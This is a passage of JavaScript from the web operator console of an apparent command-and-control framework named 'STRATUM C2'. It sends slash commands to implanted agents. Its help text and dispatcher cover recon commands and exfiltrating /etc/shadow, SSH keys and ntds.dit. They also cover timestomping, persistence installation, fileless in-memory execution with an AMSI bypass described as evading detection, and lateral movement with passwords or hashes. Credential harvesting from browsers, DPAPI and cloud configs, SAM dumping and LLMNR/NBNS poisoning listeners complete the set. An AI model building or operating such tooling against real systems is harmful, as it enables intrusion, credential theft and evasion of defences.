    if (isError)              outEl.classList.add('error');
    else if (blank || exitOk) outEl.classList.add('co-done');
    else                      outEl.classList.add('hi');
  }

  /* Like _setOutput but keeps the entry cancellable — used for "queued" agent commands
     that expect a WS response. The entry stays dim and is caught by the
     cancellation scan if another command comes in before the agent responds. */
  function _setQueued(cmd_id, bodyText) {
    const outEl = document.getElementById(`out-${cmd_id}`);
    if (!outEl) return;
    const prefix = `<span class="cid">[${cmd_id.slice(0, 8)}]</span> `;
    outEl.innerHTML = prefix + `<span class="cs-star">*</span> ` + escHtml(bodyText);
    outEl.classList.remove('pending');
    outEl.classList.add('queued');
  }

  function _loadHistory() {
    const hist = $('#shell-hist');
    if (!hist || !_activeId) return;
    hist.innerHTML = '';
    _shellLastDate = null;
    const s = _sessions[_activeId];
    API.history(_activeId).then(data => {
      const entries = (data || []).filter(h => h.timestamp !== 'timestamp' && h.command !== 'command');
      entries.forEach(h => _appendOutput({
        ts: h.timestamp, operator: h.operator,
        command: h.command, cmd_id: h.cmd_id,
        output: h.response, pending: false,
      }));

      const pc          = s?.pending_cmd;
      const pendingId   = pc?.cmd_id;

      // Any entry with blank response that is NOT the current pending command
      // was cancelled/superseded — show a dim indicator instead of blank.
      entries.forEach(h => {
        if (!h.response && h.cmd_id !== pendingId) {
          const el = document.getElementById(`out-${h.cmd_id}`);
          if (el) {
            el.innerHTML = `<span class="cid">[${h.cmd_id.slice(0, 8)}]</span> <span class="info-sysinfo-dim">—  no response</span>`;
            el.classList.remove('pending', 'queued');
            el.classList.add('hi');
          }
        }
      });

      // Promote the current in-flight command to queued state.
      if (pc) {
        const existing = document.getElementById(`out-${pendingId}`);
        if (existing) {
          existing.className = 'co queued';
          existing.innerHTML = `<span class="cid">[${pendingId.slice(0, 8)}]</span> <span class="cs-star">*</span> ${escHtml(_pendingText(pc.command))}`;
        } else {
          _appendOutput({ ts: new Date().toISOString(), command: pc.command,
                          cmd_id: pendingId, operator: pc.issued_by, pending: true });
        }
        _applyQueuedState(pendingId, pc.command);
      }
    }).catch(() => {});
  }

  /* Mark a cmd_id as fire-and-forget (no agent response expected).
     After `delay` ms the shell entry is finalized and the pending bar hidden. */
  function _markFireAndForget(cmd_id, label, delay = 4000) {
    _noResponseIds.add(cmd_id);
    // Hide pending bar immediately
    const pb = $('#pending-bar');
    if (pb) pb.classList.remove('visible');
    // Finalize shell entry after delay
    setTimeout(() => {
      _setOutput(cmd_id, label, false);
      _noResponseIds.delete(cmd_id);
    }, delay);
  }

  function _applyQueuedState(cmd_id, command) {
    if (command.startsWith('/download ')) {
      _setQueued(cmd_id, `${command} queued`);
      _downloadCmdIds.add(cmd_id);
    } else if (command.startsWith('/upload ') || command === '/upload') {
      _setQueued(cmd_id, `${command} queued`);
    } else if (command.startsWith('/sleep ')) {
      _setQueued(cmd_id, `${command} queued`);
    } else if (command.startsWith('/jitter ')) {
      _setQueued(cmd_id, `${command} queued`);
    } else if (command === '/sysinfo') {
      _setQueued(cmd_id, `/sysinfo queued — response arrives in shell`);
    } else if (command.startsWith('/timestomp')) {
      _setQueued(cmd_id, `/timestomp queued`);
    } else if (command.startsWith('/persist ')) {
      _setQueued(cmd_id, `${command} queued`);
    } else if (command === '/stop') {
      _setQueued(cmd_id, `/stop queued — agent will exit`);
    } else if (command === '/kill') {
      _setQueued(cmd_id, `/kill queued — agent will terminate`);
    } else if (command && command.startsWith('/')) {
      _setQueued(cmd_id, `${command} queued`);
    }
  }

  function onRemoteCommand({ session_id, cmd_id, command, operator, ts }) {
    if (session_id !== _activeId) return;
    if ((operator || '').toLowerCase() === (API.getUsername() || '').toLowerCase()) return;
    if (_localCmdIds.has(cmd_id)) return;        // backup: cmd_id promoted by this browser
    if (document.getElementById(`out-${cmd_id}`)) return;
    // Cancel stale pending entries — the new command from another operator supersedes them
    const hist = $('#shell-hist');
    if (hist) {
      $$('.co.pending, .co.queued', hist).forEach(el => {
        if (el.dataset.active) return;
        el.textContent = 'cancelled — superseded by ' + (operator || 'another operator');
        el.classList.remove('pending', 'queued');
        el.classList.add('warn');
      });
    }
    _appendOutput({ ts, command, cmd_id, operator, pending: true });
    _applyQueuedState(cmd_id, command);
  }

  function onArtifactsChanged(session_id) {
    if (session_id !== _activeId) return;
    if ($('#tp-artifacts.on')) _loadArtifacts();
  }

  function onCredentialsChanged(session_id) {
    if (session_id !== _activeId) return;
    if ($('#tp-creds.on')) _loadCreds();
  }

  /* Throws if the server returned ok:false (lock conflict). */
  function _checkCmd(d) {
    if (d && d.ok === false) {
      const msg = d.locked_by
        ? `Lock held by '${d.locked_by}'`
        : (d.error || 'Command rejected — another operator holds the lock');
      throw { message: msg };
    }
    return d;
  }

  function _promoteIdManual(fromId, toId) {
    if (!toId || toId === fromId) return;
    const el = document.getElementById(`out-${fromId}`);
    if (!el) return;
    // If the server-id element already exists (WS race: session.command arrived before HTTP
    // response and onRemoteCommand created a duplicate), remove that duplicate and keep ours.
    const existing = document.getElementById(`out-${toId}`);
    if (existing && existing !== el) existing.closest('.cb')?.remove();
    el.id = `out-${toId}`;
    const cidSpan = el.querySelector('.cid');
    if (cidSpan) cidSpan.textContent = `[${toId.slice(0, 8)}]`;
    const hdrCid = el.closest('.cb')?.querySelector('.cm .cid');
    if (hdrCid) hdrCid.textContent = `[${toId.slice(0, 8)}]`;
  }

  /* ── slash-command dispatcher ───────────────────────────────────────────── */
  async function _runSlash(slash, args, cmdId) {
    const id = _activeId;

    function _promoteId(d) {
      const realId = d?.cmd_id;
      _promoteIdManual(cmdId, realId);
      if (realId) _localCmdIds.add(realId);
      return realId || cmdId;
    }

    switch (slash) {

      case '/help': {
        _setOutput(cmdId, [
          '┌─────────────────────────────────────────────────────────────────────┐',
          '│                    STRATUM C2  //  WebGUI Session                  │',
          '└─────────────────────────────────────────────────────────────────────┘',
          '',
          '🐚  SHELL ACCESS',
          '  ───────────────────────────────────────────────────────────────────',
          '  Any input without a leading / is encrypted and sent to the agent.',
          '',
          '  Linux — basic recon:',
          '    whoami && id && hostname && uname -a',
          '    ps aux | grep -v \'\\[\' | head -20',
          '    cat /etc/passwd | grep -v nologin | grep -v false',
          '    ss -tlnp',
          '    find / -perm -4000 -type f 2>/dev/null',
          '    ls -la /home/$(whoami)/.ssh/',
          '',
          '  Windows — basic recon:',
          '    whoami /all',
          '    systeminfo | findstr /C:"OS Name" /C:"System Type"',
          '    net user && net localgroup administrators',
          '    Get-Process | Sort-Object CPU -Descending | Select -First 15',
          '    netstat -ano | findstr LISTEN',
          '    Get-ChildItem \'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\'',
          '',
          '⚙️   SESSION',
          '  ───────────────────────────────────────────────────────────────────',
          '  /help                              Show this help',
          '  /status                            Agent state, target info, channel paths',
          '  /sysinfo                           Query agent for full system enumeration',
          '  /history                           Switch to History tab',
          '  /clear                             Clear shell output',
          '  /kill                              Wipe persistence + stub, then terminate',
          '  /stop                              Stop agent execution only — files remain on target',
          '',
          '⏱   TIMING',
          '  ───────────────────────────────────────────────────────────────────',
          '  /sleep <s>                         Set agent check-in interval (1–86400 seconds)',
          '    /sleep 60                          # check in every ~60s',
          '    /sleep 300                         # check in every ~5min (stealthier)',
          '  /jitter <0-50>                     Set jitter % applied to sleep',
          '    /jitter 30                         # sleep ±30%',
          '',
          '📁  FILE TRANSFER',
          '  ───────────────────────────────────────────────────────────────────',
          '  /download <remote> [dest]          Download file from target',
          '    Linux:   /download /etc/shadow',
          '    Linux:   /download /home/bob/.ssh/id_rsa',
          '    Windows: /download C:\\Users\\bob\\Desktop\\pass.txt',
          '    Windows: /download C:\\Windows\\NTDS\\ntds.dit',
          '  /upload [remote_dest]              Upload local file to agent (opens file picker)',
          '    /upload                           — pick file + set dest in the dialog',
          '    /upload /tmp/payload              — pre-fills remote path in the dialog',
          '    /upload C:\\Windows\\Temp\\nc.exe',
          '',
          '🕰   TIMESTOMPING',
          '  ───────────────────────────────────────────────────────────────────',
          '  /timestomp <tgt> <ref>             Copy all timestamps from ref to target',
          '    Linux:   /timestomp /tmp/evil.sh /bin/bash',
          '    Windows: /timestomp C:\\Temp\\evil.exe C:\\Windows\\System32\\calc.exe',
          '  /timestomp -v "YYYY-MM-DD HH:MM" <t>  Set explicit timestamp on target',
          '    /timestomp -v "2024-01-15 08:30" /tmp/evil.sh',
          '',
          '🔧  PERSISTENCE ENGINE',
          '  ───────────────────────────────────────────────────────────────────',
          '  /persist probe                     Probe all available techniques (non-invasive)',
          '  /persist install <id>              Install a persistence technique by ID',
          '  /persist remove <id>               Remove a persistence technique by ID',
          '  /persist status <id>               Check status of a specific technique',
          '  Use the Persist tab for a visual overview with one-click install / remove.',
          '',
          '💉  IN-MEMORY EXECUTION  (Rust native agent only)',
          '  ───────────────────────────────────────────────────────────────────',
          '  /bof <file.o> [args]                Execute BOF/COFF in-memory (Windows only)',
          '  /assembly <file.exe> [args]         Execute .NET assembly via CLR hosting (Windows only)',
          '    /assembly Seatbelt.exe             — run with no args',
          '    /assembly Rubeus.exe triage         — run with args',
          '  /assembly-amsibypass <file.exe> [args]  .NET assembly + AMSI bypass (Windows only)',
          '    HW breakpoint (DR0) + VEH on AmsiScanBuffer — patchless, no VirtualProtect.',
          '    Evades Behavior:Win32/AMSI_Patch_T detections. Breakpoint removed after exec.',
          '    /assembly-amsibypass Rubeus.exe kerberoast',
          '  /memexec <file> [args]              Execute PE (Win) or ELF (Linux) in-memory',
          '    Windows: reflective PE loading — maps sections, resolves imports, calls entry point',
          '    Linux:   memfd_create + execve — anonymous fd, nothing on disk',
          '  /script <file> [interpreter]       Execute script fileless via stdin pipe (Win+Linux)',
          '    Windows: /script recon.ps1          — PowerShell (default)',
          '             /script enum.bat cmd       — force CMD interpreter',
          '    Linux:   /script recon.sh           — auto-detect from shebang (bash/sh/python)',
          '             /script recon.py python    — force Python interpreter',
          '    Script is staged in cloud, downloaded to memory, piped to stdin. Never touches disk.',
          '  /script-amsibypass <file> [interp]  Script + AMSI bypass (Windows PowerShell only)',
          '    HW breakpoint on AmsiScanBuffer before spawning PowerShell. Patchless, same as /assembly-amsibypass.',
          '',
          '🔗  LATERAL MOVEMENT (P2P)',
          '  ───────────────────────────────────────────────────────────────────',
          '  /jump <module> <target> [opts]      Deploy P2P child agent via lateral movement',
          '    Modules: ssh, psexec, psexec_psh, wmi, scshell, winrm',
          '    /jump ssh 10.0.1.5 user=root key=/root/.ssh/id_rsa',
          '    /jump psexec 10.0.1.10 user=admin password=P@ss',
          '    /jump wmi DC01 user=DOMAIN\\admin hash=aad3b435...',
          '    Options: user= password= hash= key= port= pipe= service= link= platform=',
          '',
          '  /generate-listener [tcp|smb] [linux|windows] [opts]',
          '                                       Build standalone P2P listener beacon',
          '    Generates a P2P child binary you can deploy manually (USB, phishing, etc.)',
          '    The beacon listens for a parent link — connect with /p2p link tcp <addr>',
          '    /generate-listener tcp linux port=4444',
          '    /generate-listener smb windows pipe=spool_mgr',
          '    Options: port= pipe= bind= platform= label=',
          '',
          '  /kill-cascade                        Kill session + all P2P descendants (leaf-first)',
          '',
          '🔑  CREDENTIAL HARVESTING',
          '  ───────────────────────────────────────────────────────────────────',
          '  /creds harvest                     Collect creds (Firefox, cloud, SSH, FileZilla, mRemoteNG, Git...)',
          '    Windows: DPAPI/Chrome/Edge/Firefox/WiFi/RDP/Vault/SSH/AWS/Azure/GCloud/Docker/Kube',
          '             FileZilla/mRemoteNG/PS history/unattend.xml/Git',
          '    Linux:   shadow/SSH/Firefox/Kerberos/Git/AWS/Docker/Kube/Azure/GCloud/Keyring/WiFi/SSSD/history',
          '    Firefox master password: staged → firefox_decrypt + hashcat -m 26100',
          '    DPAPI blobs + master keys: staged → mimikatz dpapi:: or DPAPImk2john -m 15900',
          '    mRemoteNG: staged → default key mR3m (AES-GCM PBKDF2-SHA1)',
          '  /creds harvest decrypt             + decrypt Chrome/Edge/DPAPI via CryptUnprotectData (OPSEC↑)',
          '  /creds coerce                      Force local auth to capture hashes (Win: pipe, Linux: SSH agent)',
          '  /creds sam                         In-memory SAM hash extraction (Windows, requires SYSTEM)',
          '  /creds listen start <proto:port>   Start credential listener + LLMNR/NBNS poisoners',
          '    /creds listen start smb:445       — SMB listener, captures NTLMv2 (default)',
          '    /creds listen start smb:8445      — SMB on custom port (Windows-friendly)',
          '    /creds listen start http:80       — HTTP Basic auth, captures plaintext credentials',
          '    /creds listen start http-ntlm:80  — HTTP NTLM, captures NTLMv2 hashes',
          '    Multiple listeners can run simultaneously.',
          '  /creds listen stop                 Stop ALL listeners + poisoners',
          '  /creds listen stop http:80         Stop a specific listener',
          '  /creds listen dump                 Retrieve captured credentials + poisoner stats',
        ].join('\n'));
        break;
      }

      case '/status': {
        const s = await API.session(id);
        const admins = new Set(['root', 'system', 'nt authority\\system', 'administrator']);
        const privStr = admins.has((s.target_privs || '').toLowerCase()) ? '  [root/admin]' : '';
        const lines = [
          `  State:     ${(s.state || '?').toUpperCase()}`,
        ];
        if (s.last_hb_ts) lines.push(`  Heartbeat: ${fmtAge(s.last_hb_ts)}`);
        if (s.target_host) {
          lines.push('  ─── Target ──────────────────────────');
          lines.push(`    Host:    ${s.target_host}`);
          lines.push(`    User:    ${s.target_user || '—'}${privStr}`);
          if (s.target_domain) lines.push(`    Domain:  ${s.target_domain}`);
          lines.push(`    IP int:  ${s.target_ip || '—'}`);
          lines.push(`    IP ext:  ${s.target_ip_ext || '—'}`);
          lines.push(`    OS:      ${s.target_os || '—'}`);
          if (s.agent_pid)  lines.push(`    PID:     ${s.agent_pid}`);
          if (s.remote_cwd) lines.push(`    CWD:     ${s.remote_cwd}`);
        }
        lines.push('  ─── Channel ─────────────────────────');
        lines.push(`    Provider: ${_providerLabel(s.provider)}`);
        lines.push(`    Mode:     ${s.deploy_mode || '—'}`);
        lines.push(`    Sleep:    ${s.base_sleep ?? '—'}s  ±${s.jitter_percent ?? '—'}%`);
        _setOutput(cmdId, lines.join('\n'));
        break;
      }

      case '/sysinfo': {
        const d = _checkCmd(await API.sysinfo(id));
        const rid = _promoteId(d);
        _setQueued(rid, `/sysinfo queued — response arrives in shell`);
        if (rid) _sysinfoRunning.add(rid);
        break;
      }

      case '/sleep': {
        if (!args.length) { _setOutput(cmdId, 'Usage: /sleep <seconds>  (1–86400)', true); break; }
        const s = parseInt(args[0], 10);
        if (isNaN(s) || s < 1 || s > 86400) { _setOutput(cmdId, 'Sleep must be 1–86400', true); break; }
        const d = _checkCmd(await API.sleep(id, s));
        const rid = _promoteId(d);
        _setQueued(rid, `/sleep ${s} queued`);
        break;
      }

      case '/jitter': {
        if (!args.length) { _setOutput(cmdId, 'Usage: /jitter <percent>  (0–50)', true); break; }
        const j = parseInt(args[0], 10);
        if (isNaN(j) || j < 0 || j > 50) { _setOutput(cmdId, 'Jitter must be 0–50', true); break; }
        const d = _checkCmd(await API.jitter(id, j));
        const rid = _promoteId(d);
        _setQueued(rid, `/jitter ${j} queued`);
        break;
      }

      case '/download': {
        if (!args.length) { _setOutput(cmdId, 'Usage: /download <remote_path>', true); break; }
        const remote = args[0];
        const d = _checkCmd(await API.download(id, remote));
        const rid = _promoteId(d);
        _setQueued(rid, `/download ${remote} queued`);
        if (rid) _downloadCmdIds.add(rid);
        break;
      }

      case '/upload': {
        _openUploadModal(args[0] || '', cmdId);
        break;
      }

      case '/timestomp': {
        let payload;
        if (args[0] === '-v' && args.length >= 3) {
          payload = { target: args[2], explicit_time: args[1] };
        } else if (args.length >= 2) {
          payload = { target: args[0], reference: args[1] };
        } else {
          _setOutput(cmdId,
            'Usage: /timestomp <target> <reference>\n' +
            '       /timestomp -v "YYYY-MM-DD HH:MM" <target>', true);
          break;
        }
        const d = _checkCmd(await API.timestomp(id, payload));
        const rid = _promoteId(d);
        _setQueued(rid, `/timestomp queued`);
        break;
      }

      case '/persist': {
        if (!args.length) { _setOutput(cmdId, 'Usage: /persist probe|install <id>|remove <id>|status <id>|check', true); break; }
        const sub = args[0];
        let pd, prid;
        if (sub === 'probe') {
          pd = _checkCmd(await API.persistProbe(id));
          prid = _promoteId(pd);
          if (pd?.cmd_id) _persistProbeIds.set(pd.cmd_id, 'all');
          _setQueued(prid, '/persist probe queued');
        } else if (sub === 'install' && args[1]) {
          pd = _checkCmd(await API.persistInstall(id, args[1]));
          prid = _promoteId(pd); _setQueued(prid, `/persist install ${args[1]} queued`);
          if (prid) _persistCmdIds.set(prid, { op: 'install', tid: args[1], sid: id });
        } else if (sub === 'remove' && args[1]) {
          pd = _checkCmd(await API.persistRemove(id, args[1]));
          prid = _promoteId(pd); _setQueued(prid, `/persist remove ${args[1]} queued`);
          if (prid) _persistCmdIds.set(prid, { op: 'remove', tid: args[1], sid: id });
        } else if (sub === 'status' && args[1]) {
          pd = _checkCmd(await API.persistStatus(id, args[1]));
          prid = _promoteId(pd); _setQueued(prid, `/persist status ${args[1]} queued`);
          if (prid) _persistCmdIds.set(prid, { op: 'status', tid: args[1], sid: id });
        } else if (sub === 'check') {
          pd = _checkCmd(await API.persist(id, sub));
          prid = _promoteId(pd);
          if (pd?.cmd_id) _persistCheckIds.add(pd.cmd_id);
          _setQueued(prid, `/persist check queued`);
        } else {
          _setOutput(cmdId, 'Usage: /persist probe|install <id>|remove <id>|status <id>|check', true);
        }
        break;
      }

      case '/creds': {
        if (!args.length) { _setOutput(cmdId, 'Usage: /creds harvest [decrypt]|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', true); break; }
        const sub = args[0];
        let cd, crid;
        if (sub === 'harvest') {
          const hasDecrypt = args.includes('decrypt');
          const cmdType = hasDecrypt ? 'CREDS_HARVEST_DECRYPT' : 'CREDS_HARVEST';
          const label = hasDecrypt ? '/creds harvest decrypt' : '/creds harvest';
          cd = _checkCmd(await API.sendCommand(id, cmdType, label));
          crid = _promoteId(cd);
          _setQueued(crid, `${label} queued — collecting credentials`);
        } else if (sub === 'coerce') {
          cd = _checkCmd(await API.sendCommand(id, 'CREDS_COERCE', '/creds coerce'));
          crid = _promoteId(cd);
          _setQueued(crid, '/creds coerce queued');
        } else if (sub === 'sam') {
          cd = _checkCmd(await API.sendCommand(id, 'CREDS_SAM', '/creds sam'));
          crid = _promoteId(cd);
          _setQueued(crid, '/creds sam queued — dumping SAM/SYSTEM/SECURITY');
        } else if (sub === 'listen') {
          const listenSub = args[1] || '';
          if (listenSub === 'start') {
            const spec = args[2] || 'smb:445';
            // Parse proto:port — accept "http:80", "smb:8445", or bare port "8445" (defaults to smb)
            let proto, port;
            if (spec.includes(':')) {
              [proto, port] = spec.split(':');
              proto = proto.toLowerCase();
              if (!['smb', 'http', 'http-ntlm'].includes(proto)) {
                _setOutput(cmdId, `Unknown protocol "${proto}". Use smb, http, or http-ntlm.\n  Examples: /creds listen start http:80  |  /creds listen start http-ntlm:8080`, true);
                break;
              }
            } else {
              proto = 'smb';
              port = spec;
            }
            if (!/^\d+$/.test(port) || +port < 1 || +port > 65535) {
              _setOutput(cmdId, `Invalid port "${port}". Use 1–65535.\n  Examples: /creds listen start http:80  |  /creds listen start smb:8445`, true);
              break;
            }
            // Warn on Windows + smb:445
            const sessOs = (_sessions[_activeId]?.target_os || '').toLowerCase();
            if (sessOs.includes('windows') && proto === 'smb' && port === '445') {
              const proceed = await confirm('Port 445 Blocked on Windows',
                'Port 445 is occupied by the native LanmanServer service on Windows — the SMB listener will fail to bind.\n\n'
                + 'Try one of these instead:\n'
                + '  /creds listen start smb:8445   — SMB on alternate port\n'
                + '  /creds listen start http:80    — HTTP Basic auth (plaintext, works in browsers)\n\n'
                + 'Continue with smb:445 anyway?');
              if (!proceed) { _setOutput(cmdId, 'Aborted — try /creds listen start http:80 or smb:8445'); break; }
            }
            cd = _checkCmd(await API.sendCommand(id, `CREDS_LISTEN_START:${proto}:${port}`, `/creds listen start ${proto}:${port}`));
            crid = _promoteId(cd);
            _setQueued(crid, `/creds listen start ${proto}:${port} queued`);
          } else if (listenSub === 'stop') {
            const stopSpec = args[2] || '';
            const stopCmd = stopSpec ? `CREDS_LISTEN_STOP:${stopSpec}` : 'CREDS_LISTEN_STOP';
            const stopLabel = stopSpec ? `/creds listen stop ${stopSpec}` : '/creds listen stop';
            cd = _checkCmd(await API.sendCommand(id, stopCmd, stopLabel));
            crid = _promoteId(cd);
            _setQueued(crid, `${stopLabel} queued`);
          } else if (listenSub === 'dump') {
            cd = _checkCmd(await API.sendCommand(id, 'CREDS_LISTEN_DUMP', '/creds listen dump'));
            crid = _promoteId(cd);
            _setQueued(crid, '/creds listen dump queued');
          } else {
            _setOutput(cmdId, 'Usage: /creds listen start <proto:port>|stop [proto:port]|dump\n  Examples: /creds listen start http:80  |  /creds listen stop http:80', true);
          }
        } else {
          _setOutput(cmdId, 'Usage: /creds harvest|coerce|sam|listen start <proto:port>|listen stop [proto:port]|listen dump', true);
        }
        break;
      }

      case '/bof':
      case '/assembly':
      case '/assembly-amsibypass':
      case '/memexec':
      case '/script':
      case '/script-amsibypass': {
        if (args.length && _stagedFile) {
          const typeMap = { '/bof': 'bof', '/assembly': 'assembly', '/assembly-amsibypass': 'assembly-amsibypass', '/memexec': 'memexec', '/script': 'script', '/script-amsibypass': 'script-amsibypass' };
          const execType = typeMap[slash];
          const f = _stagedFile;
          _stagedFile = null;
          const argsStr = args.slice(1).join(' ');
          _appendOutput({
            ts: new Date().toISOString(), operator: API.getUsername(),
            command: `${slash} ${f.name}${argsStr ? ' ' + argsStr : ''}`, cmd_id: cmdId, pending: true,
          });
          { const _el = document.getElementById(`out-${cmdId}`);
            if (_el) _el.dataset.active = '1'; }
          _setQueued(cmdId, `Staging ${f.name} (${(f.size/1024).toFixed(1)} KB)…`);
          try {
            const d = await API.execInline(id, execType, f, argsStr);
            const rid = d?.command?.cmd_id || cmdId;
            if (d?.command?.cmd_id) {
              _promoteIdManual(cmdId, d.command.cmd_id);
              _localCmdIds.add(d.command.cmd_id);
            }
            _setQueued(rid, `${slash} ${f.name} ${argsStr} — executing in-memory`);
          } catch (e) {
            _setOutput(cmdId, `Error: ${e.message || e}`, true);
          }
          break;
        }
        const fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.style.display = 'none';
        document.body.appendChild(fileInput);
        fileInput.onchange = () => {
          const f = fileInput.files[0];
          if (fileInput.parentNode) fileInput.parentNode.removeChild(fileInput);
          if (!f) return;
          _stagedFile = f;
          const inp = $('#cmd-in');
          if (inp) {
            inp.value = `${slash} ${f.name} `;
            inp.disabled = false;
            inp.focus();
          }
          const sendBtn = $('#btn-send');
          if (sendBtn) sendBtn.disabled = false;
        };
        fileInput.addEventListener('cancel', () => {
          if (fileInput.parentNode) fileInput.parentNode.removeChild(fileInput);
          const inp = $('#cmd-in');
          if (inp) { inp.disabled = false; inp.focus(); }
          const sendBtn = $('#btn-send');
          if (sendBtn) sendBtn.disabled = false;
        });
        fileInput.click();
        throw { _filePickerOpened: true };
      }

      case '/kill': {
        const ok = await confirm('Kill Agent',
          'Agent will wipe all artifacts and self-terminate — irreversible. Proceed?');
        if (!ok) { _setOutput(cmdId, 'Aborted.'); break; }
        const d = _checkCmd(await API.killAgent(id));
        const rid = _promoteId(d);
        _markFireAndForget(rid, 'KILL sent — agent wiping and terminating');
        break;
      }

      case '/kill-cascade': {
        const ok = await confirm('Cascade Kill',
          'This will kill the session AND all P2P descendants — irreversible. Proceed?');
        if (!ok) { _setOutput(cmdId, 'Aborted.'); break; }
        const kc = await API.killCascade(id);
        if (kc?.ok) {
          _setOutput(cmdId,
            `Cascade kill dispatched — ${kc.killed?.length || 0} session(s) killed: ${(kc.killed || []).join(', ') || 'none'}` +
            (kc.errors?.length ? `\nErrors: ${kc.errors.join('; ')}` : ''));
          Toast.info(`Cascade kill: ${kc.killed?.length || 0} session(s) terminated`);
        } else {
          _setOutput(cmdId, `ERROR: ${kc?.error || 'cascade kill failed'}`);
        }
        break;
      }

      case '/generate-listener': {
        const glOpts = {};
        let glBindType = 'tcp';
        let glPlatform = 'linux';
        for (const a of args) {
          const lower = a.toLowerCase();
          if (lower === 'tcp' || lower === 'smb') { glBindType = lower; continue; }
          if (lower === 'linux' || lower === 'windows') { glPlatform = lower; continue; }
          const [k, ...vp] = a.split('=');
          const v = vp.join('=');
          if (k && v) glOpts[k.toLowerCase()] = v;
        }
        const glParams = {
          donor_session_id: id,
          bind_type: glOpts.bind_type || glBindType,
          platform: glOpts.platform || glPlatform,
          port: parseInt(glOpts.port || '0', 10) || 0,
          pipe: glOpts.pipe || '',
          bind_address: glOpts.bind || glOpts.address || '',
          label: glOpts.label || '',
        };
        const gl = await API.generateListener(glParams);
        if (gl?.ok) {
          _setOutput(cmdId,
            `P2P listener build queued\n` +
            `  Session:  ${gl.session_id}\n` +
            `  Bind:     ${gl.bind_type} ${gl.bind_address}\n` +
            `  Platform: ${gl.platform}\n` +
            `  Download: ${gl.download_url} (available after build completes)`);
          Toast.info('P2P Listener', `Building ${gl.platform} ${gl.bind_type} listener…`);
        } else {
          _setOutput(cmdId, `ERROR: ${gl?.error || gl?.detail || 'generate-listener failed'}`);
        }
        break;
      }

      case '/stop': {
        const d = _checkCmd(await API.sendCommand(id, 'EXIT', '/stop'));
        const rid = d?.cmd_id ? (_promoteIdManual(cmdId, d.cmd_id), d.cmd_id) : cmdId;
        _markFireAndForget(rid, 'EXIT sent — agent stopped');
        break;
      }

      case '/jump': {
        if (args.length < 2) {
          _setOutput(cmdId,
            'Usage: /jump <module> <target> [user=... password=... hash=... key=... port=... pipe=... service=...]\n' +
            'Modules: ssh, psexec, psexec_psh, wmi, scshell, winrm\n' +
            'Example: /jump ssh 10.0.1.5 user=root key=/root/.ssh/id_rsa\n' +
            '         /jump psexec 10.0.1.10 user=admin password=P@ss', true);
          break;
        }
        const mod = args[0].toLowerCase();
        const tgt = args[1];
        const jumpOpts = { module: mod, target: tgt };
        for (let i = 2; i < args.length; i++) {
          const kv = args[i].split('=');
          if (kv.length === 2) {
            const k = kv[0].toLowerCase();
            if (k === 'user') jumpOpts.user = kv[1];
            else if (k === 'password' || k === 'pass') jumpOpts.password = kv[1];
            else if (k === 'hash') jumpOpts.hash = kv[1];
            else if (k === 'key' || k === 'key_path') jumpOpts.key_path = kv[1];
            else if (k === 'port') jumpOpts.port = parseInt(kv[1], 10) || 0;
            else if (k === 'pipe') jumpOpts.pipe = kv[1];
            else if (k === 'service') jumpOpts.service = kv[1];
            else if (k === 'link') jumpOpts.link_type = kv[1];
            else if (k === 'platform') jumpOpts.platform = kv[1];
          }
        }
        try {
          const jr = await API.jump(id, jumpOpts);
          if (jr && jr.ok) {
            _setQueued(cmdId, `jump ${mod} → ${tgt} building agent…`);
            Toast.info('Jump started', `${mod} → ${tgt} (child: ${(jr.child_session_id || '').slice(0, 8)})`);
          } else {
            _setOutput(cmdId, `Jump failed: ${jr?.error || 'unknown error'}`, true);
          }
        } catch (e) {
          _setOutput(cmdId, `Jump error: ${e.message}`, true);
          Toast.error('Jump failed', e.message);
        }
        break;
      }

      case '/history': {
        _switchTab('history');
        _setOutput(cmdId, 'Switched to History tab.');
        break;
      }

      case '/p2p': {
        const sub = (args[0] || '').toLowerCase();
        if (sub === 'link') {
          const proto = (args[1] || '').toLowerCase();
          const addr = args[2] || '';
          if (!addr) {
            _setOutput(cmdId, 'Usage: /p2p link tcp <host:port>  |  /p2p link smb <target-ip> [pipe-name]', true);
            break;
          }
          try {
            let r;
            if (proto === 'smb') {
              r = await API.p2pLinkSmb(id, addr, args[3] || '');
            } else {
              r = await API.p2pLinkTcp(id, addr);
            }
            if (r && r.ok) {
              _setQueued(cmdId, `P2P link ${proto} ${addr} — queued`);
            } else {
              _setOutput(cmdId, `P2P link failed: ${r?.error || r?.locked_by || 'unknown'}`, true);
            }
          } catch (e) {
            _setOutput(cmdId, `P2P link error: ${e.message}`, true);
          }
        } else if (sub === 'unlink') {
          const guid = args[1] || '';
          if (!guid) { _setOutput(cmdId, 'Usage: /p2p unlink <child-guid>', true); break; }
          try {
            const r = await API.p2pUnlink(id, guid);
            if (r && r.ok) _setQueued(cmdId, `P2P unlink ${guid} — queued`);
            else _setOutput(cmdId, `P2P unlink failed: ${r?.error || 'unknown'}`, true);
          } catch (e) { _setOutput(cmdId, `P2P unlink error: ${e.message}`, true); }
        } else {
          _setOutput(cmdId, 'Usage: /p2p link tcp <host:port>  |  /p2p link smb <target-ip> [pipe-name]  |  /p2p unlink <guid>', true);
        }
        break;
      }

      default: {
        if (slash.startsWith('!')) {
          _setOutput(cmdId,
            'Host shell commands (!) are not available in WebGUI.\n' +
            'Host shell pass-through (!) is not supported in the WebGUI.', true);
        } else {
          _setOutput(cmdId,
            `Unknown command: ${slash}\nType /help to list available commands.`, true);
        }
      }
    }
  }

  async function _sendCmd(cmd) {
    if (!_activeId || !cmd.trim()) return;
    const inp     = $('#cmd-in');
    const sendBtn = $('#btn-send');

    if (inp) inp.value = '';
    _cmdHistory.unshift(cmd.trim());
    _cmdHistIdx = -1;

    // /clear is purely client-side — wipe output without a shell entry
    if (cmd.trim() === '/clear') {
      const hist = $('#shell-hist');
      if (hist) hist.innerHTML = '';
      _shellLastDate = null;
      if (inp) inp.focus();
      return;
    }

    if (inp)     inp.disabled = true;
    if (sendBtn) sendBtn.disabled = true;

    const cmdId  = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2);
    const parts  = cmd.trim().split(/\s+/);
    const slash  = parts[0].toLowerCase();
    const isSlash = slash.startsWith('/') || slash.startsWith('!');

    const hist = $('#shell-hist');

    const _filePickCmds = new Set(['/bof', '/assembly', '/assembly-amsibypass', '/memexec', '/script', '/script-amsibypass', '/upload']);
    const _isFilePick   = _filePickCmds.has(slash);

    if (!_isFilePick) {
      _stagedFile = null;
